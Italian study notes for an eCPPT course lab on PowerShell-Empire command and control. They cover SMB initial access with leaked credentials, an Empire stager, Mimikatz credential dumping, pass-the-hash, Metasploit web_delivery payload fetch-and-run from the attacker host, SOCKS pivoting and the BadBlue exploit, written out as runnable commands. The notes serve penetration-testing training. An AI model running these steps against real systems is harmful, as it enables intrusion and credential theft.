# 09 — Red Team Ops with PowerShell-Empire (Command & Control)

> **Modulo:** Command & Control (C2) · **Video:** 9/11
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [09_ Red Team Ops with PowerShell-Empire.txt](09_ Red Team Ops with PowerShell-Empire.txt) · [09_ Red Team Ops with PowerShell-Empire.srt](09_ Red Team Ops with PowerShell-Empire.srt)

## Concetti chiave

- Lab pratico end-to-end di una **Red Team Op** in ambiente Windows usando **PowerShell-Empire CLI** + **Metasploit** per il pivoting.
- **Initial access NON è ottenuto via C2**: l'accesso iniziale arriva da un **error log esposto su porta 4983** (web server Apache) che leakka le credenziali dell'amministratore → autenticazione **SMB (smbexec.py)** su `demo.ine.local`.
- Empire entra in gioco **dopo** l'initial access, per la **post-exploitation**: drop di uno **stager multi/launcher (PowerShell base64)** dalla shell SMB → callback al **listener http** → agent.
- Workflow Empire CLI **5-step**: `uselistener http` → `usestager` → eseguire il launcher sul target → `agents` → `interact <agent>`.
- Modulo `situational_awareness/network/winenum`, dump credenziali con **Mimikatz LSA dump** (modulo `credentials/mimikatz/lsadump`).
- Integrazione con **Metasploit `web_delivery`** (target=PowerShell) tramite il modulo Empire `code_execution/invoke_metasploitpayload` per ottenere una **meterpreter session** parallela.
- **Pivoting**: `autoroute` + `socks_proxy` di Metasploit → accesso a `fileserver.ine.local` (subnet interna) via **SOCKS v5 porta 1080** dal browser Kali.
- Secondo target compromesso via **BadBlue exploit (pass-thru buffer overflow)** con payload **bind_tcp** (perché siamo dietro pivot, no reverse).
- L'**asterisco** nel nome agent = **high integrity** (admin/SYSTEM).

## Spiegazione approfondita

### Topologia del lab
- Kali Linux (attacker) → `eth1` IP variabile (anno per anno).
- `demo.ine.local` — Windows Server 2012 R2, raggiungibile direttamente. Servizi: 135, 139, 445 (SMB), 3389 (RDP), **4983** (Apache + error log con creds), pivot verso la subnet interna.
- `fileserver.ine.local` — Windows Server 2016, **NON raggiungibile** dalla Kali. Accessibile solo via pivot da demo. Servizi (port scan da demo): 80, 3389, 445.

### Initial Access
1. Nmap full TCP + service version su `demo.ine.local`.
2. Porta 4983 in browser → error log Apache mostra credenziali admin (incluse `@` e `#` nel pwd).
3. `impacket-smbexec administrator:'<pass>'@demo.ine.local` → shell `nt authority\system` (verificare `whoami /priv`).
4. Confermato accesso a `fileserver.ine.local` via ping dall'interno di demo → pivot point.

### Post-exploitation con Empire
1. Server: `sudo powershell-empire server` (REST API 1337, Socket.IO 5000). Build errors C# = ignorabili nel lab.
2. Client: `powershell-empire client` (tab separata) → si connette a `localhost:1337`.
3. **Listener**: `uselistener http` → `set Host <kali_ip>` → `set Port 8888` → `execute`. `main` per tornare.
4. **Stager**: `usestager multi/launcher` → `set Listener http` → `execute` → copia il one-liner PowerShell base64.
5. Incolla il launcher nella shell SMB su demo → callback: `new agent ... checked in` → `agents`.
6. `rename <agent_id> demo-ine` → `interact demo-ine`.
7. Comandi nell'agent: `shell whoami /priv`, `info`, `history`, `sleep <s>`. Output non istantaneo: arriva al prossimo beacon (default delay 5s).
8. **Moduli**: `usemodule powershell/situational_awareness/network/winenum`, `usemodule powershell/credentials/mimikatz/lsadump` → `execute` → recupero NTLM hash administrator + local admin.
9. **Lateral movement**: `usemodule powershell/lateral_movement/invoke_smbexec` → `set Username administrator` → `set Hash <NTLM>` → `set ComputerName <ip>` → `set Command whoami` → `execute` (Pass-the-Hash).

### Pivoting verso fileserver.ine.local (Empire + Metasploit)
1. **Port scan via Empire**: `usemodule powershell/situational_awareness/network/portscan` → `set Hosts <fileserver_ip>` → `execute` → trova 80/3389/445 su fileserver.
2. **MSF web_delivery**: `use exploit/multi/script/web_delivery` → `set TARGET 2` (PowerShell) → `set PAYLOAD windows/meterpreter/reverse_tcp` → `set LHOST <kali>` → `exploit` → genera URL.
3. **Esegui il payload via Empire**: `usemodule powershell/code_execution/invoke_metasploitpayload` → `set URL http://<kali>:8080/<rnd>` → `execute` → Meterpreter session su demo.
4. **Autoroute**: in msf `use post/multi/manage/autoroute` → `set SESSION 1` → `run` → route per la subnet interna.
5. **SOCKS proxy**: `use auxiliary/server/socks_proxy` → `set SRVHOST <kali>` → `run` → SOCKS v5 su **1080**.
6. **Browser**: Firefox → Settings → manual proxy → SOCKS v5 `<kali>:1080` → naviga `http://fileserver.ine.local` → vede BadBlue.
7. **Exploit BadBlue**: `use exploit/windows/http/badblue_passthru` → **`set PAYLOAD windows/meterpreter/bind_tcp`** (no reverse! il target non può ritornare alla Kali) → `set RHOSTS fileserver.ine.local` → `exploit` → meterpreter su Win2016.
8. Post: `load incognito` → `list_tokens -u` → `impersonate_token "NT AUTHORITY\SYSTEM"` → `migrate <lsass_pid>` → `hashdump`.

### Port forwarding via Empire (alternativa al socks)
`usemodule powershell/management/invoke_portfwd` → `set ListenAddress <kali>` → `set ListenPort 445` → `set ConnectAddress <target>` → `set ConnectPort 445` → `execute`.

## Comandi & strumenti

```bash
# Server / client
sudo powershell-empire server
powershell-empire client

# Initial access (fuori da Empire)
impacket-smbexec administrator:'P@ssw0rd#'@demo.ine.local

# MSF integration
msfconsole
use exploit/multi/script/web_delivery
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <kali>
exploit
```

```text
# Dentro al client Empire
uselistener http
set Host <kali_ip>
set Port 8888
execute
main
listeners

usestager multi/launcher
set Listener http
execute
# -> copia il blob PowerShell base64

agents
rename <id> demo-ine
interact demo-ine
shell whoami /priv
info
history

usemodule powershell/situational_awareness/network/winenum
execute
usemodule powershell/credentials/mimikatz/lsadump
execute
usemodule powershell/situational_awareness/network/portscan
set Hosts <fileserver_ip>
execute
usemodule powershell/code_execution/invoke_metasploitpayload
set URL http://<kali>:8080/<rnd>
execute
usemodule powershell/lateral_movement/invoke_smbexec
set Username administrator
set Hash <NTLM>
set ComputerName <ip>
set Command whoami
execute
```

| Comando | Scopo |
|---|---|
| `uselistener http` / `set Host/Port` / `execute` | Crea e avvia listener HTTP |
| `usestager multi/launcher` | One-liner PowerShell base64 per drop dell'agent |
| `agents` / `interact <name>` / `rename` | Gestione agent |
| `shell <cmd>` | Esecuzione comando shell dentro l'agent |
| `info` / `history` | Dettagli agent / log task |
| `usemodule <path>` | Carica modulo (situational awareness, creds, lateral, code_exec) |
| `sleep <s>` | Cambia delay beacon |

## Esempi pratici

Flusso completo del lab in 11 passi:
1. Nmap su demo → 4983 web.
2. Browser → error log → leak creds admin.
3. `impacket-smbexec` → shell SYSTEM su demo.
4. Avvio `powershell-empire server` + `client`.
5. Setup listener HTTP su 8888.
6. Genera stager `multi/launcher`, incolla nella shell SMB.
7. Agent callback → `interact` → enum (`winenum`) + `lsadump`.
8. Port scan da Empire verso fileserver.
9. `web_delivery` MSF → `invoke_metasploitpayload` Empire → meterpreter su demo.
10. `autoroute` + `socks_proxy` (1080) → browser via SOCKS5 → BadBlue.
11. `badblue_passthru` con **bind_tcp** → SYSTEM su fileserver via impersonation/migrate/`hashdump`.

## Punti d'attenzione per l'esame eCPPT

- **C2 ≠ Initial Access**: il C2 entra in gioco DOPO aver bucato. Domanda classica: "qual è il ruolo di Empire in una kill chain?" → post-exploitation.
- **Stager `multi/launcher`** = one-liner PowerShell **base64**, ideale per drop da qualsiasi shell di comando.
- **Asterisco nel nome agent** = high integrity (admin). Memorizzare.
- **Beacon delay**: i comandi NON sono real-time; ogni task arriva al prossimo callback (default 5s). Modificabile con `sleep` o `set Delay` sull'agent.
- **Pivoting pattern eCPPT**: compromise → autoroute → socks_proxy → tool esterno (browser/proxychains) per raggiungere subnet interna.
- **Bind vs Reverse payload**: dietro un pivot senza reverse-route, **usare bind_tcp** (target attende, attacker si connette). Errore comune in esame.
- **Pass-the-Hash via Empire**: `lateral_movement/invoke_smbexec` con `Username` + `Hash` NTLM.
- **`code_execution/invoke_metasploitpayload`** = ponte ufficiale Empire → Metasploit, prende un URL `web_delivery`.
- I service account possono essere agganciati anche via Empire ma il modulo `situational_awareness` PowerView è il primo step per enumeration in dominio.

## Collegamenti con altri video

- Precedente: [[08_Introduction to PowerShell-Empire]] — teoria e architettura.
- Prossimo: [[010_Red Team Ops with Starkiller]] — stesso lab via GUI.
- Pivoting / SOCKS: vedi modulo Lateral Movement & Pivoting (`autoroute`, `socks_proxy`).
- Pass-the-Hash: modulo Active Directory.
- Mimikatz / LSA dump: modulo Privilege Escalation.
